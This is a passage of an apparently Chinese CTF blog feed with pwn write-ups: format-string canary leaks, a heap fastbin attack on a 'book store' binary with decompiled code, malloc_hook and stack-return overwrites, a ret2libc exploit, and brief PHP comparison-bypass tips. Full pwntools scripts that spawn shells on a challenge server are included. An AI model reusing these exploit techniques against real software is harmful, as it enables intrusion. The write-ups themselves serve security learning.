class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal=[&apos;bash&apos;]</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">#p=process(&apos;./game&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,10002)</span><br><span class="line">p.recvuntil(&apos;?&apos;)</span><br><span class="line">p.sendline(&apos;%71$p&apos;.ljust(250,b&apos;\x00&apos;)+p32(0x365))</span><br><span class="line">p.recvuntil(&apos;:\n&apos;)</span><br><span class="line">canary=p.recvuntil(&apos;W&apos;)[:-1]</span><br><span class="line">print(&apos;canary is &apos;+ canary)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">p.sendline(&apos;%3$p&apos;.ljust(250,&apos;\x00&apos;)+p32(0x19))</span><br><span class="line">p.recvuntil(&apos;:\n&apos;)</span><br><span class="line">base=p.recvuntil(&apos;W&apos;)[:-1]</span><br><span class="line">print(&apos;base is &apos;+ base)</span><br><span class="line">p.sendline(&apos;\x00&apos;*0x100+p32(int(canary,16))+&apos;A&apos;*12+p32(int(base[:-3]+&apos;2f5&apos;,16)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="vitamin"><a href="#vitamin" class="headerlink" title="vitamin"></a>vitamin</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>简单的堆，基本上没有检查</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>UAF将堆分配到bss段改buf指针指向got表，修改got表某个函数即可</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="store"><a href="#store" class="headerlink" title="store"></a>store</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>选项题，功能有add,read,sell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">    保护： </span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">int add_book()</span><br><span class="line">&#123;</span><br><span class="line">  size_t size; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  for ( HIDWORD(size) = 0; HIDWORD(size) &lt;= 0xF &amp;&amp; ptr[5 * HIDWORD(size)]; ++HIDWORD(size) )</span><br><span class="line">    ;</span><br><span class="line">  if ( HIDWORD(size) == 16 )</span><br><span class="line">    puts(&quot;Too many books&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  puts(&quot;What is the author name?&quot;);</span><br><span class="line">  readn(0x28LL * HIDWORD(size) + 0x602060, 0x1F);</span><br><span class="line"></span><br><span class="line">  puts(&quot;How long is the book name?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;size);</span><br><span class="line"></span><br><span class="line">  if ( (unsigned int)size &gt; 0x50 )</span><br><span class="line">    return puts(&quot;Too big!&quot;);</span><br><span class="line">  ptr[5 * HIDWORD(size)] = malloc((unsigned int)size);</span><br><span class="line">  puts(&quot;What is the name of the book?&quot;);</span><br><span class="line">  readn(ptr[5 * HIDWORD(size)], size);          // size==0 时，溢出</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 漏洞函数</span><br><span class="line">__int64 __fastcall readn(__int64 a1, int len)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned int v3; // eax</span><br><span class="line">  unsigned __int8 buf; // [rsp+1Bh] [rbp-5h]</span><br><span class="line">  unsigned int v5; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v5 = 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (unsigned int)(len - 1);</span><br><span class="line">    if ( (unsigned int)result &lt;= v5 )</span><br><span class="line">      break;</span><br><span class="line">    read(0, &amp;buf, 1uLL);</span><br><span class="line">    result = buf;</span><br><span class="line">    if ( buf == &apos;\n&apos; )</span><br><span class="line">      break;</span><br><span class="line">    v3 = v5++;</span><br><span class="line">    *(_BYTE *)(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int sellbook()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int idx; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Which book do you want to sell?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;idx);</span><br><span class="line">  if ( idx &gt; 0x10 )</span><br><span class="line">    return puts(&quot;Out of bound!&quot;);</span><br><span class="line">  if ( !ptr[5 * idx] )                          // ptr as inuse</span><br><span class="line">    return puts(&quot;No such book!&quot;);</span><br><span class="line">  free((void *)ptr[5 * idx]);</span><br><span class="line">  ptr[5 * idx] = 0LL;                           // ptr=0</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int readbook()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int idx; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Which book do you want to sell?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;idx);</span><br><span class="line">  if ( idx &gt; 0x10 )</span><br><span class="line">    return puts(&quot;Out of bound!&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if ( ptr[5 * idx] )                           // 检查ptr</span><br><span class="line">    return printf(&quot;Author:%s\nBookname:%s\n&quot;, 0x28LL * idx + 0x602060, ptr[5 * idx]);    -&gt;%s泄漏信息</span><br><span class="line">  return puts(&quot;No such book!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>在输入size为0时readn函数漏洞，此时可以输入无限长度，可以溢出。结合readbook函数可以泄露堆地址；</p><p>fastbin attack将chunk分配到bss段存储指针及author name的地方，修改指针为某一函数got地址计算得到libc基址。</p><p>之后就需要getshell了，想法有：</p><ol><li>写got表，但是full relro，所以不行；</li><li>复写malloc_hook或free_hook,这个尝试了半天，因为在malloc_hook附近分配时需要用0x7f绕过大小检查，但是用户自己申请的大小最大为0x50，最终size最大便是0x60，于是想直接在bss段伪造0x70大小的chunk，并free掉，但是坑爹的是bss段一共就只有0x7f大小。。。最终放弃；</li><li>无奈之下，尝试将chunk分配到栈中覆盖返回地址，终于getshell！！</li></ol><p>从出题的学长那里学到了另一种思路</p><ol><li>利用fastbin attack将一个伪造的size作为fd放入fastbinY中，而该指针会在main_arena 处存放，然后我们可以将其作为fakechunk的size，将chunk分配到main_arena处</li><li>分配过去之后，就可以修改main_arena处存放的top chunk地址，此时将top chunk地址提到malloc hook之上，再次申请一个chunk，如果选择的size在fastbinY中不存在，那么便会从topchunk中切割，也就会分配到malloc hook之上</li><li>修改最后一个chunk的内容即修改malloc hook的值</li></ol><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#sh= process(&apos;./book&apos;)#[&apos;./book&apos;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)</span><br><span class="line">sh =remote(&apos;159.65.68.241&apos;,&apos;10004&apos;)</span><br><span class="line">elf = ELF(&apos;./book&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(a_name,size,b_name):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;author name?\n&apos;)</span><br><span class="line">sh.sendline(a_name)</span><br><span class="line">sh.recvuntil(&apos;book name?\n&apos;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&apos;book?\n&apos;)</span><br><span class="line">sh.sendline(b_name)</span><br><span class="line"></span><br><span class="line">def read(idx):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;sell?\n&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;sell?\n&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;)</span><br><span class="line">add(&apos;c&apos;,0,&apos;d&apos;)</span><br><span class="line">add(&apos;e&apos;,0,&apos;f&apos;)</span><br><span class="line">add(&apos;g&apos;,0,&apos;h&apos;)</span><br><span class="line">add(&apos;i&apos;,0,&apos;j&apos;)</span><br><span class="line">#--------leak heap_base-----------------#</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0)+p64(0x21),0,&apos;b&apos;*0x20)</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;b&apos;*0x20)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))-0x40</span><br><span class="line">print &apos;heap_base : &apos;+hex(heap_base)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#---------fastbin_attack leak libc_base-----------------#</span><br><span class="line">delete(4)</span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;A&apos;,0,&apos;b&apos;*0x10+p64(0)+p64(0x21)+p64(0x602060))</span><br><span class="line">add(&apos;f&apos;,0,&apos;wwwwwwww&apos;)</span><br><span class="line">add(&apos;a&apos;,0,&apos;a&apos;*0x10+p64(elf.got[&apos;puts&apos;]))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">puts_got = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_base = puts_got- libc.symbols[&apos;puts&apos;]</span><br><span class="line">print &apos;libc_base : &apos;+hex(libc_base) </span><br><span class="line">environ_ptr_addr = libc_base + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">print &apos;environ_ptr_addr : &apos;+ hex(environ_ptr_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#---------get shell-------------------------------#</span><br><span class="line">one_gadget_off = 0x45216</span><br><span class="line">one_gadget_addr = one_gadget_off + libc_base</span><br><span class="line">malloc_hook_addr = libc_base + 0x3c4b10</span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(environ_ptr_addr))</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">environ_addr = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))</span><br><span class="line">rbp_addr = environ_addr-0xf8</span><br><span class="line">print &apos;one_gadget_addr : &apos;+hex(one_gadget_addr)</span><br><span class="line">print &apos;malloc_hook_addr : &apos;+hex(malloc_hook_addr)</span><br><span class="line">print &apos;rbp_addr : &apos;+hex(rbp_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+&apos;c&apos;*0x20+p64(0x6020b0)+&apos;d&apos;*0x10+p64(0x21))</span><br><span class="line">delete(2)</span><br><span class="line">delete(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+p64(rbp_addr-0x1e))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;\n&apos;,0x30,&apos;\n&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;c&apos;,0x30,&apos;a&apos;*0x16+p64(one_gadget_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./book&quot;)</span><br><span class="line">#p=remote(&quot;159.65.68.241&quot;,&quot;10004&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;,checksec=False)</span><br><span class="line">malloc_hook = libc.symbols[&quot;__malloc_hook&quot;]</span><br><span class="line">def add(name,size,content):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">    p.sendlineafter(&quot;name?&quot;,name)</span><br><span class="line">    p.sendlineafter(&quot;name?&quot;,str(size))</span><br><span class="line">    p.sendlineafter(&quot;book&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">    p.sendlineafter(&quot;sell?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def read(index):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)</span><br><span class="line">    p.sendlineafter(&quot;sell?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">code = ELF(&quot;./book&quot;,checksec=False)</span><br><span class="line">puts_got = code.got[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&quot;1&quot;,0,&quot;a&quot;)      #0</span><br><span class="line">add(&quot;2&quot;,0x40,&quot;b&quot;)  #1</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #2</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0x51)*2,0,&quot;a&quot;*0x18+p64(0x51)+p64(0x602060))  #0</span><br><span class="line">add(&quot;b&quot;,0x40,&quot;b&quot;)        #1</span><br><span class="line">add(&quot;c&quot;,0x40,&quot;c&quot;*0x10+p64(puts_got))  #3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(0)</span><br><span class="line">p.recvuntil(&quot;name:&quot;)</span><br><span class="line">puts_addr = p.recv(6)+&quot;\x00&quot;*2</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[&quot;puts&quot;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">print(&quot;-------------------&quot;)</span><br><span class="line"></span><br><span class="line">add(&quot;d&quot;,0,&quot;d&quot;)       #4</span><br><span class="line">add(&quot;e&quot;,0x50,&quot;e&quot;)    #5</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #6</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">delete(5) </span><br><span class="line">delete(4)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(&quot;d&quot;,0,&quot;d&quot;*0x18+p64(0x61)+p64(0x51)+&quot;123&quot;)  #4</span><br><span class="line">add(&quot;e&quot;,0x50,&quot;e&quot;)    #5</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;g&quot;,0,&quot;d&quot;)       #6</span><br><span class="line">add(&quot;h&quot;,0x40,&quot;e&quot;)    #7</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #8</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)</span><br><span class="line"></span><br><span class="line">add(&quot;g&quot;,0,&quot;g&quot;*0x18+p64(0x51)+p64(libc_base+0x3c4b40)+&quot;123&quot;)  #8</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;h&quot;,0x40,&quot;g&quot;)   #7</span><br><span class="line">print hex(libc_base+0x3c4b40)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;i&quot;,0x40,p64(0)*5+p64(libc_base+0x3c4b00))  #9</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;exp&quot;,0,p64(libc_base+0x4526a))   #10</span><br><span class="line">print hex(libc_base+0x4526a)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;name?&quot;,&quot;aaa&quot;)</span><br><span class="line">p.sendlineafter(&quot;name?&quot;,&quot;0&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Fun with PHP Code Audit</title>
      <link href="/2019/01/31/fun-with-php-code-audit/"/>
      <url>/2019/01/31/fun-with-php-code-audit/</url>
      <content type="html"><![CDATA[<p><em>pwn的头疼＋心累，玩一玩入门的PHP代码审计</em></p><h1 id="基础传参"><a href="#基础传参" class="headerlink" title="基础传参"></a>基础传参</h1><p>从最基本的来说，常用的网页传参即 GET 与 POST<br>对于用户来讲，GET传参就是往网页链接后面直接添加参数，比如说<a href="https://test.php?a=1" target="_blank" rel="noopener">https://test.php?a=1</a>;<br>而POST传参一般需要写个脚本或者使用插件，比如说火狐浏览器的hackbar插件。</p><h1 id="简单的PHP函数检测绕过"><a href="#简单的PHP函数检测绕过" class="headerlink" title="简单的PHP函数检测绕过"></a>简单的PHP函数检测绕过</h1><ol><li>is_numeric: 检测是否为数字，但是如果输入 数字＋字母 （1ab）便能过检测，但是 php中 1ab ==1 为true</li><li>extract： 从数组中将变量导入到当前的符号表。使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 但一般若设置为空，则有希望通过判断</li><li>对于数字之间的比较，通常可以使用数组来绕过，比如说 strcmp，strpos，MD5 ，sha1 等对两个用户输入字符串比较的，都可以使用数组尝试</li></ol>]]></content>
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>fireshell-2019-pwn</title>
      <link href="/2019/01/29/fireshell-2019-pwn/"/>
      <url>/2019/01/29/fireshell-2019-pwn/</url>
      <content type="html"><![CDATA[<p><em>本来在之前没搞完的jarvisOJ那边遇到了问题，想问学长来着，结果被拉过来看看这个比赛，被自己菜哭</em></p><h1 id="leakless"><a href="#leakless" class="headerlink" title="leakless"></a>leakless</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char buf; // [esp+0h] [ebp-48h]</span><br><span class="line">return read(0, &amp;buf, 0x100u);</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一个简单的栈溢出，第一反应是去泄露libc版本，后面又突然想着把shellcode写到bss段，但是奈何总是不成功，vmmap才发现bss段不可执行，且不存在能够wx的段，因为以前用LibcSearcher没成功（ps:完全不记得为什么），偏偏用DynElf爆破失败，所以还是转向LibcSearcher.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./leakless&apos;)</span><br><span class="line">libc = ELF(&apos;./leakless&apos;)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(libc.symbols[&apos;puts&apos;])+p32(libc.symbols[&apos;feedme&apos;]) +p32(libc.got[&apos;puts&apos;])</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">puts_got_addr = u32(sh.recv(4))</span><br><span class="line">print &quot;puts_got_addr: &quot;+hex(puts_got_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(&quot;puts&quot;,puts_got_addr)</span><br><span class="line"></span><br><span class="line">system_addr = puts_got_addr - obj.dump(&apos;puts&apos;)+obj.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = puts_got_addr - obj.dump(&apos;puts&apos;) + obj.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"> </span><br><span class="line">success( &quot;system_addr: &quot;+hex(system_addr))</span><br><span class="line">success(&quot;binsh_addr: &quot;+hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(system_addr) + p32(libc.symbols[&apos;main&apos;]) + p32(binsh_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="casino"><a href="#casino" class="headerlink" title="casino"></a>casino</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>用户输入的值与随机数匹配成功100次，之后会读取flag.txt文件并输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seed = (unsigned int)time(0LL) / 10;</span><br><span class="line">seed += bet;(bet=1)</span><br><span class="line">srand(seed);</span><br><span class="line">rand();</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>格式化字符串漏洞，但是大小限制在了0x10，能够泄露出来seed，也就能预测第一次的值，然后因为要泄露100次，想着顺便把栈上的记录次数的值或者bet一起改掉，但是因为长度限制，最后有点懵。感觉二者不可得兼。</p><p>看大佬们的wp，因为seed是用time(0)/10+ bet ,可以先自己先利用time将seed计算出来，然后计算rand();因为python和c的rand()不同，所以得考虑如何将在python脚本中计算c的随机数，可以有：</p><ol><li>单独写一份c的程序计算随机数，脚本中调用c程序(昨天也是这么做的)； </li><li>使用python和c的混合编程包：ctypes。</li></ol><p>经实践，同一个seed得到的随机数序列都是一样的…，而题中通过time(0)/10对seed给了容错</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 